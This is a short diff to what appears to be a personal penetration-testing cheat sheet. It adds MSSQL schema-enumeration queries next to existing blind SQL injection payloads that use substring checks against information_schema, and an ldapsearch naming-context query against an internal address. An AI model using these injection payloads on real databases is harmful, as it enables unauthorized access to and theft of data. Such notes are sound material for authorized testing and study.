@@ -288,6 +288,9 @@ https://www.facebook.com/watch/?v=2060455820930493
 ' or substring(database()) like "%a%'-- -
 ' or substring(select table_name from information_schema.tables where table_schema=database(), 1, 1) = "a"-- -
 ' or substring(select table_column from information_schema.columns where table_schema=database() and table_name='users' 1, 1) = "a"-- -
+select column_name from {database_name}.INFORMATION_SCHEMA.columns order by (select null) offset {i} rows fetch next 1 rows only # fetch only one row
+select table_name from {database_name}.INFORMATION_SCHEMA.tables order by (select null) offset {i} rows fetch next 1 rows only
+select column_name from sys.{database_name}
 
 [ldap: dse namingcontexts search]
 ldapsearch -h 172.31.3.9 -x -s base namingcontexts
